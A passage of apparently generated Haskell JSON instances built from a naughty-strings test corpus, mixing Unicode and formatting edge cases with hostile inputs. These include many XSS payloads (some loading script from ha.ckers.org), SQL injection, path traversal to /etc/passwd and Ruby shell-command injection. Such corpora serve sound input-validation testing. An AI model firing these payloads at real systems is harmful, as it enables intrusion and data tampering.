\&\x000e0067\&\x000e0068\&\x000e0069\&\x000e006a\&\x000e006b\&\x000e006c\&\x000e006d\&\x000e006e\&\x000e006f\&\x000e0070\&\x000e0071\&\x000e0072\&\x000e0073\&\x000e0074\&\x000e0075\&\x000e0076\&\x000e0077\&\x000e0078\&\x000e0079\&\x000e007a\&\x000e007b\&\x000e007c\&\x000e007d\&\x000e007e\&\x000e007f\&" .= the1A
        , Just $ "₀₁₂" .= the10A
        , Just $ "1.00" .= the100A
        , Just $ "1.0/0.0" .= the1000A
        , Just $ "1'000,00" .= the100000A
        , Just $ "1 000 000.00" .= the100000000A
        , Just $ "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢" .= the11A
        , Just $ "1/2" .= the12A
        , Just $ "123456789012345678901234567890123456789" .= the123456789012345678901234567890123456789A
        , Just $ "\x0001d47b\&\x0001d489\&\x0001d486\& \x0001d492\&\x0001d496\&\x0001d48a\&\x0001d484\&\x0001d48c\& \x0001d483\&\x0001d493\&\x0001d490\&\x0001d498\&\x0001d48f\& \x0001d487\&\x0001d490\&\x0001d499\& \x0001d48b\&\x0001d496\&\x0001d48e\&\x0001d491\&\x0001d494\& \x0001d490\&\x0001d497\&\x0001d486\&\x0001d493\& \x0001d495\&\x0001d489\&\x0001d486\& \x0001d48d\&\x0001d482\&\x0001d49b\&\x0001d49a\& \x0001d485\&\x0001d490\&\x0001d488\&" .= the15A
        , Just $ "\x0001d4e3\&\x0001d4f1\&\x0001d4ee\& \x0001d4fa\&\x0001d4fe\&\x0001d4f2\&\x0001d4ec\&\x0001d4f4\& \x0001d4eb\&\x0001d4fb\&\x0001d4f8\&\x0001d500\&\x0001d4f7\& \x0001d4ef\&\x0001d4f8\&\x0001d501\& \x0001d4f3\&\x0001d4fe\&\x0001d4f6\&\x0001d4f9\&\x0001d4fc\& \x0001d4f8\&\x0001d4ff\&\x0001d4ee\&\x0001d4fb\& \x0001d4fd\&\x0001d4f1\&\x0001d4ee\& \x0001d4f5\&\x0001d4ea\&\x0001d503\&\x0001d502\& \x0001d4ed\&\x0001d4f8\&\x0001d4f0\&" .= the16A
        , Just $ "\x0001d57f\&\x0001d58d\&\x0001d58a\& \x0001d596\&\x0001d59a\&\x0001d58e\&\x0001d588\&\x0001d590\& \x0001d587\&\x0001d597\&\x0001d594\&\x0001d59c\&\x0001d593\& \x0001d58b\&\x0001d594\&\x0001d59d\& \x0001d58f\&\x0001d59a\&\x0001d592\&\x0001d595\&\x0001d598\& \x0001d594\&\x0001d59b\&\x0001d58a\&\x0001d597\& \x0001d599\&\x0001d58d\&\x0001d58a\& \x0001d591\&\x0001d586\&\x0001d59f\&\x0001d59e\& \x0001d589\&\x0001d594\&\x0001d58c\&" .= the17A
        , Just $ "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\& \x0001f1e6\&\x0001f1eb\&\x0001f1e6\&\x0001f1f2\&\x0001f1f8\&" .= the18A
        , Just $ "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\&\x0001f1e6\&" .= the19A
        , Just $ "1;DROP TABLE users" .= the1DROPTABLEUsersA
        , Just $ "-1E02" .= the1E02A
        , Just $ "1E2" .= the1E2A
        , Just $ "1#QNAN" .= the1QnanA
        , Just $ "1#SNAN" .= the1SnanA
        , Just $ "¸˛Ç◊ı˜Â¯˘¿" .= the2A
        , Just $ "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\&\x0001f1e6\&\x0001f1eb\&\x0001f1e6\&\x0001f1f2\&" .= the20A
        , Just $ "\x0001f469\&\x0001f3fd\&" .= the21A
        , Just $ "\x0001f6be\& \x0001f192\& \x0001f193\& \x0001f195\& \x0001f196\& \x0001f197\& \x0001f199\& \x0001f3e7\&" .= the22A
        , Just $ "﷽" .= the23A
        , Just $ "\xfeff\&" .= the24A
        , Just $ "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ" .= the26A
        , Just $ "\xfffe\&" .= the27A
        , Just $ "Œ„´‰ˇÁ¨ˆØ∏”’" .= the3A
        , Just $ "œ∑´®†¥¨ˆøπ“‘" .= the4A
        , Just $ "Ⱥ" .= the5A
        , Just $ "Ⱦ" .= the6A
        , Just $ "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999" .= the999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999A
        , Just $ "# The next two lines may appear to be blank or mojibake in some viewers." .= theNextTwoLinesMayAppearToBeBlankOrMojibakeInSomeViewersA
        , Just $ "The quic\x0008\&\x0008\&\x0008\&\x0008\&\x0008\&\x0008\&k brown fo\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&x... [Beeeep]" .= theQuicKBrownFoXBeeeepA
        , Just $ "TRUE" .= trueA
        , Just $ "#\tTwo-Byte Characters" .= twoByteCharactersA
        , Just $ "# U+0000, U+000A, or U+000D (NUL, LF, CR)." .= u0000U000AOrU000DNULLFCRA
        , Just $ "<u oncopy=alert()> Copy me</u>" .= uOncopyAlertCopyMeUA
        , Just $ "undef" .= undefA
        , Just $ "#\tUnicode font" .= unicodeFontA
        , Just $ "#\tUnicode Numbers" .= unicodeNumbersA
        , Just $ "#\tUnwanted Interpolation" .= unwantedInterpolationA
        , Just $ "%x('ls -al /')" .= xLsAlA
        , Just $ "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" .= zGOA
        ]

instance FromJSON A where
    parseJSON (Object v) = A
        <$> v .: "パーティーへ行かないか"
        <*> v .: "和製漢語"
        <*> v .: "田中さんにあげて下さい"
        <*> v .: "｀ｨ(´∀｀∩"
        <*> v .: "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو."
        <*> v .: "٠١٢٣٤٥٦٧٨٩"
        <*> v .: "ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็"
        <*> v .: "!@#$%^&*()`~"
        <*> v .: "-0"
        <*> v .: "00˙Ɩ$-"
        <*> v .: "0,00"
        <*> v .: "0.0/0.0"
        <*> v .: "-1"
        <*> v .: "1/0"
        <*> v .: "1'000'000.00"
        <*> v .: "1E02"
        <*> v .: "';alert(123);t='"
        <*> v .: "false"
        <*> v .: "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>"
        <*> v .: "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "\x202a\&\x202a\&test\x202a\&"
        <*> v .: "True"
        <*> v .: "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF"
        <*> v .: ";alert(123);"
        <*> v .: "\";alert(123);t=\""
        <*> v .: "\\\";alert('XSS');//"
        <*> v .: "-."
        <*> v .: "# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often"
        <*> v .: "Arsenal canal"
        <*> v .: "\" autofocus onkeyup=\"javascript:alert(123)"
        <*> v .: "AUX"
        <*> v .: "¡™£¢∞§¶•ªº–≠"
        <*> v .: "#\tChanging length when lowercased"
        <*> v .: "#\tCharacters which increase in length (2 to 3 bytes) when lowercased"
        <*> v .: "classic"
        <*> v .: "#\tCommand Injection (Ruby)"
        <*> v .: "<>?:\"{}|_+"
        <*> v .: "%d"
        <*> v .: "Dick Van Dyke"
        <*> v .: "dontMakeAMap"
        <*> v .: "Dr. Herman I. Libshitz"
        <*> v .: " "
        <*> v .: "$ENV{'HOME'}"
        <*> v .: "../../../../../../../../../../../etc/hosts"
        <*> v .: "../../../../../../../../../../../etc/passwd%00"
        <*> v .: "False"
        <*> v .: "'\"'"
        <*> v .: "{0}"
        <*> v .: "\x2066\&test\x2067\&"
        <*> v .: "#       fonts, and have a number of special behaviors"
        <*> v .: "<foo val=`bar' />"
        <*> v .: "`⁄€‹›ﬁﬂ‡°·‚—±"
        <*> v .: "-,"
        <*> v .: "$HOME"
        <*> v .: "#\tHuman injection"
        <*> v .: "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰"
        <*> v .: "<!--[if<img src=x onerror=javascript:alert(1)//]> -->"
        <*> v .: "<!--[if]><script>javascript:alert(1)</script -->"
        <*> v .: "<IMG SRC=\"jav   ascript:alert('XSS');\">"
        <*> v .: "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"
        <*> v .: "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">"
        <*> v .: "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
        <*> v .: "<img src\\x09=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src\\x11=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=\\x00\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=\\x09\"javascript:alert(1)\">"
        <*> v .: "<img src=x\\x09onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x\\x10onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x\\x11onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x\\x12onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x\\x13onerror=\"javascript:alert(1)\">"
        <*> v .: "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>"
        <*> v .: "<img \\x00src=x onerror=\"alert(1)\">"
        <*> v .: "<img\\x10src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img\\x13src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img\\x32src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img \\x39src=x onerror=\"javascript:alert(1)\">"
        <*> v .: ",./;'[]\\-="
        <*> v .: ","
        <*> v .: "INF"
        <*> v .: "-Infinity"
        <*> v .: "#\tInnocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem)"
        <*> v .: "Jimmy Clitheroe"
        <*> v .: "Kernel.exit(1)"
        <*> v .: "#\tKnown CVEs and Vulnerabilities"
        <*> v .: "Lightwater Country Park"
        <*> v .: "LPT2"
        <*> v .: "LPT3"
        <*> v .: "`ls -al /`"
        <*> v .: "\\"
        <*> v .: "\x0080\&\x0081\&\x0082\&\x0083\&\x0084\&\x0086\&\x0087\&\x0088\&\x0089\&\x008a\&\x008b\&\x008c\&\x008d\&\x008e\&\x008f\&\x0090\&\x0091\&\x0092\&\x0093\&\x0094\&\x0095\&\x0096\&\x0097\&\x0098\&\x0099\&\x009a\&\x009b\&\x009c\&\x009d\&\x009e\&\x009f\&"
        <*> v .: "#\tMSDOS/Windows Special Filenames"
        <*> v .: "nil"
        <*> v .: "# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F."
        <*> v .: "None"
        <*> v .: "(null)"
        <*> v .: " onfocus=JaVaSCript:alert(123) autofocus"
        <*> v .: "' OR '1'='1"
        <*> v .: "Penistone Community Church"
        <*> v .: "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out"
        <*> v .: "PRN"
        <*> v .: "'"
        <*> v .: "0"
        <*> v .: "1"
        <*> v .: "\x202b\&test\x202b\&"
        <*> v .: "RomansInSussex.co.uk"
        <*> v .: "%s"
        <*> v .: "<<< %s(un='%s') = %u"
        <*> v .: "<sc<script>ript>alert(123)</sc</script>ript>"
        <*> v .: "\"><script>alert(123);</script x=\""
        <*> v .: "#\tScript Injection"
        <*> v .: "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >"
        <*> v .: "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
        <*> v .: "</script><script>alert(123)</script>"
        <*> v .: "\"`'><script>\\x00javascript:alert(1)</script>"
        <*> v .: "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "\"`'><script>\\x0Cjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\x0Djavascript:alert(1)</script>"
        <*> v .: "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "\"`'><script>\\xC2\\x85javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>"
        <*> v .: "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
        <*> v .: "#\tSQL Injection"
        <*> v .: "(╯°□°）╯︵ ┻━┻)"
        <*> v .: "#\tString which can reveal system files when parsed by a badly configured XML parser"
        <*> v .: "#\tStrings that test for known vulnerabilities"
        <*> v .: "#\tStrings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string."
        <*> v .: "#\tStrings which can call system commands within Ruby/Rails applications"
        <*> v .: "#\tStrings which consists of Japanese-style emoticons which are popular on the web"
        <*> v .: "#\tStrings which contain bold/italic/etc. versions of normal characters"
        <*> v .: "#\tStrings which contain common unicode symbols (e.g. smart quotes)"
        <*> v .: "#\tStrings which contain Emoji; should be the same behavior as two-byte characters, but not always"
        <*> v .: "#\tStrings which contain misplaced quotation marks; can cause encoding errors"
        <*> v .: "#\tStrings which contain unicode subscripts/superscripts; can cause rendering issues"
        <*> v .: "#\tStrings which crashed iMessage in various versions of iOS"
        <*> v .: "#\tStrings which may cause human to reinterpret worldview"
        <*> v .: "Super Bowl XXX"
        <*> v .: "( ͡° ͜ʖ ͡°)"
        <*> v .: "הָיְתָהtestالصفحات التّحول"
        <*> v .: "</textarea><script>alert(123)</script>"
        <*> v .: "+0"
        <*> v .: "0..0"
        <*> v .: "0,0,0"
        <*> v .: "0,0/0,0"
        <*> v .: "0x0"
        <*> v .: "\x00ad\&\x0600\&\x0601\&\x0602\&\x0603\&\x0604\&\x0605\&\x061c\&\x06dd\&\x070f\&\x180e\&\x200b\&\x200c\&\x200d\&\x200e\&\x200f\&\x202a\&\x202b\&\x202c\&\x202d\&\x202e\&\x2060\&\x2061\&\x2062\&\x2063\&\x2064\&\x2066\&\x2067\&\x2068\&\x2069\&\x206a\&\x206b\&\x206c\&\x206d\&\x206e\&\x206f\&\xfeff\&\xfff9\&\xfffa\&\xfffb\&\x000110bd\&\x0001bca0\&\x0001bca1\&\x0001bca2\&\x0001bca3\&\x0001d173\&\x0001d174\&\x0001d175\&\x0001d176\&\x0001d177\&\x0001d178\&\x0001d179\&\x0001d17a\&\x000e0001\&\x000e0020\&\x000e0021\&\x000e0022\&\x000e0023\&\x000e0024\&\x000e0025\&\x000e0026\&\x000e0027\&\x000e0028\&\x000e0029\&\x000e002a\&\x000e002b\&\x000e002c\&\x000e002d\&\x000e002e\&\x000e002f\&\x000e0030\&\x000e0031\&\x000e0032\&\x000e0033\&\x000e0034\&\x000e0035\&\x000e0036\&\x000e0037\&\x000e0038\&\x000e0039\&\x000e003a\&\x000e003b\&\x000e003c\&\x000e003d\&\x000e003e\&\x000e003f\&\x000e0040\&\x000e0041\&\x000e0042\&\x000e0043\&\x000e0044\&\x000e0045\&\x000e0046\&\x000e0047\&\x000e0048\&\x000e0049\&\x000e004a\&\x000e004b\&\x000e004c\&\x000e004d\&\x000e004e\&\x000e004f\&\x000e0050\&\x000e0051\&\x000e0052\&\x000e0053\&\x000e0054\&\x000e0055\&\x000e0056\&\x000e0057\&\x000e0058\&\x000e0059\&\x000e005a\&\x000e005b\&\x000e005c\&\x000e005d\&\x000e005e\&\x000e005f\&\x000e0060\&\x000e0061\&\x000e0062\&\x000e0063\&\x000e0064\&\x000e0065\&\x000e0066\&\x000e0067\&\x000e0068\&\x000e0069\&\x000e006a\&\x000e006b\&\x000e006c\&\x000e006d\&\x000e006e\&\x000e006f\&\x000e0070\&\x000e0071\&\x000e0072\&\x000e0073\&\x000e0074\&\x000e0075\&\x000e0076\&\x000e0077\&\x000e0078\&\x000e0079\&\x000e007a\&\x000e007b\&\x000e007c\&\x000e007d\&\x000e007e\&\x000e007f\&"
        <*> v .: "₀₁₂"
        <*> v .: "1.00"
        <*> v .: "1.0/0.0"
        <*> v .: "1'000,00"
        <*> v .: "1 000 000.00"
        <*> v .: "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢"
        <*> v .: "1/2"
        <*> v .: "123456789012345678901234567890123456789"
        <*> v .: "\x0001d47b\&\x0001d489\&\x0001d486\& \x0001d492\&\x0001d496\&\x0001d48a\&\x0001d484\&\x0001d48c\& \x0001d483\&\x0001d493\&\x0001d490\&\x0001d498\&\x0001d48f\& \x0001d487\&\x0001d490\&\x0001d499\& \x0001d48b\&\x0001d496\&\x0001d48e\&\x0001d491\&\x0001d494\& \x0001d490\&\x0001d497\&\x0001d486\&\x0001d493\& \x0001d495\&\x0001d489\&\x0001d486\& \x0001d48d\&\x0001d482\&\x0001d49b\&\x0001d49a\& \x0001d485\&\x0001d490\&\x0001d488\&"
        <*> v .: "\x0001d4e3\&\x0001d4f1\&\x0001d4ee\& \x0001d4fa\&\x0001d4fe\&\x0001d4f2\&\x0001d4ec\&\x0001d4f4\& \x0001d4eb\&\x0001d4fb\&\x0001d4f8\&\x0001d500\&\x0001d4f7\& \x0001d4ef\&\x0001d4f8\&\x0001d501\& \x0001d4f3\&\x0001d4fe\&\x0001d4f6\&\x0001d4f9\&\x0001d4fc\& \x0001d4f8\&\x0001d4ff\&\x0001d4ee\&\x0001d4fb\& \x0001d4fd\&\x0001d4f1\&\x0001d4ee\& \x0001d4f5\&\x0001d4ea\&\x0001d503\&\x0001d502\& \x0001d4ed\&\x0001d4f8\&\x0001d4f0\&"
        <*> v .: "\x0001d57f\&\x0001d58d\&\x0001d58a\& \x0001d596\&\x0001d59a\&\x0001d58e\&\x0001d588\&\x0001d590\& \x0001d587\&\x0001d597\&\x0001d594\&\x0001d59c\&\x0001d593\& \x0001d58b\&\x0001d594\&\x0001d59d\& \x0001d58f\&\x0001d59a\&\x0001d592\&\x0001d595\&\x0001d598\& \x0001d594\&\x0001d59b\&\x0001d58a\&\x0001d597\& \x0001d599\&\x0001d58d\&\x0001d58a\& \x0001d591\&\x0001d586\&\x0001d59f\&\x0001d59e\& \x0001d589\&\x0001d594\&\x0001d58c\&"
        <*> v .: "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\& \x0001f1e6\&\x0001f1eb\&\x0001f1e6\&\x0001f1f2\&\x0001f1f8\&"
        <*> v .: "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\&\x0001f1e6\&"
        <*> v .: "1;DROP TABLE users"
        <*> v .: "-1E02"
        <*> v .: "1E2"
        <*> v .: "1#QNAN"
        <*> v .: "1#SNAN"
        <*> v .: "¸˛Ç◊ı˜Â¯˘¿"
        <*> v .: "\x0001f1fa\&\x0001f1f8\&\x0001f1f7\&\x0001f1fa\&\x0001f1f8\&\x0001f1e6\&\x0001f1eb\&\x0001f1e6\&\x0001f1f2\&"
        <*> v .: "\x0001f469\&\x0001f3fd\&"
        <*> v .: "\x0001f6be\& \x0001f192\& \x0001f193\& \x0001f195\& \x0001f196\& \x0001f197\& \x0001f199\& \x0001f3e7\&"
        <*> v .: "﷽"
        <*> v .: "\xfeff\&"
        <*> v .: "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ"
        <*> v .: "\xfffe\&"
        <*> v .: "Œ„´‰ˇÁ¨ˆØ∏”’"
        <*> v .: "œ∑´®†¥¨ˆøπ“‘"
        <*> v .: "Ⱥ"
        <*> v .: "Ⱦ"
        <*> v .: "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
        <*> v .: "# The next two lines may appear to be blank or mojibake in some viewers."
        <*> v .: "The quic\x0008\&\x0008\&\x0008\&\x0008\&\x0008\&\x0008\&k brown fo\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&\x0007\&x... [Beeeep]"
        <*> v .: "TRUE"
        <*> v .: "#\tTwo-Byte Characters"
        <*> v .: "# U+0000, U+000A, or U+000D (NUL, LF, CR)."
        <*> v .: "<u oncopy=alert()> Copy me</u>"
        <*> v .: "undef"
        <*> v .: "#\tUnicode font"
        <*> v .: "#\tUnicode Numbers"
        <*> v .: "#\tUnwanted Interpolation"
        <*> v .: "%x('ls -al /')"
        <*> v .: "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮"

instance ToJSON B where
    toJSON (B _B _2B _3B aHrefHTTPFooBarXYAImgAltImgSrcXXOnerrorJavascriptAlert1AB aHrefJavascriptX00JavascriptAlert1IDFuzzelement1TestAB aHrefJavascriptX0DJavascriptAlert1IDFuzzelement1TestAB aHrefX02JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX04JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX0AjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX0DjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX0EjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX0FjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX16JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX19JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX1AjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX1DjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefX1EjavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefXE2X80X81JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefXE2X80X82JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefXE2X80XA9JavascriptJavascriptAlert1IDFuzzelement1TestAB aHrefXE2X80XAFjavascriptJavascriptAlert1IDFuzzelement1TestAB abcDivStyleXExpressionX5CJavascriptAlert1DEFB abcDivStyleXX0AexpressionJavascriptAlert1DEFB abcDivStyleXX0DexpressionJavascriptAlert1DEFB abcDivStyleXXE2X80X82ExpressionJavascriptAlert1DEFB abcDivStyleXXE2X80X83ExpressionJavascriptAlert1DEFB abcDivStyleXXE2X80X85ExpressionJavascriptAlert1DEFB abcDivStyleXXE2X80X87ExpressionJavascriptAlert1DEFB abcDivStyleXXE2X80X8AexpressionJavascriptAlert1DEFB ambitiousB appearInInputB ath0B autofocusOnkeyupJavascriptAlert123B bB b100000B bIMGSRCOnmouseoverAlertXxsB bScriptAlert123ScriptB bTouchTmpBlnsFailB basementB braggadociousB butNow20CforMyGreatestTrick8MB byteOrderMarksUFEFFAndUFFFEEachOnItsOwnLineB com1B com3B commonlyMisinterpretedAsAdditionalGraphicCharactersB conB contextsDividedIntoThreeGroupsBasedOnUSLayoutKeyboardPositionB creditHTTPSTwitterCOMJifaStatus625776454479970304B cunningB devNullTouchTmpBlnsFailEchoB dontMakeAMapB emptyB evalPutsHelloWorldB expressionB falseB fileB fileInclusionB fluffyB fooValBarB friskyB generalCategoryCFInUnicode800B hEWHOWATSBEHINDTHEWALB helpB hilariousB httpA3030B iOSVulnerabilitiesB ifYouReReadingThisYouVeBeenInAComaForAlmost20YearsNowWeReTryingANewTechniqueWeDonTKnowWhereThisMessageWillEndUpInYourDreamButWeHopeItWorksPleaseWakeUpWeMissYouB iframeSrcHTTPHaCkersOrgScriptletHTMLB imgSRC14JavascriptAlertXSSB imgSRCJavX09AscriptAlertXSSB imgSRCOnmouseoverAlertXxsB imgSRCX6AX61X76X61X73X63X72X69X70X74X3AX61X6CX65X72X74X28X27X58X53X53X27X29B imgSrc00001060000097000011800000970000115000009900001140000105000011200001160000058000009700001080000101000011400001160000040000003900000880000083000008300000390000041B imgSrcX00XOnerrorJavascriptAlert1B imgSrcXOnerrorX11JavascriptAlert1B imgSrcXOnerrorX12JavascriptAlert1B imgSrcXxxXX0AonerrorJavascriptAlert1B imgSrcXxxXX0ConerrorJavascriptAlert1B imgSrcXxxXX0DonerrorJavascriptAlert1B imgX00SrcXOnerrorJavascriptAlert1B imgX11SrcXOnerrorJavascriptAlert1B 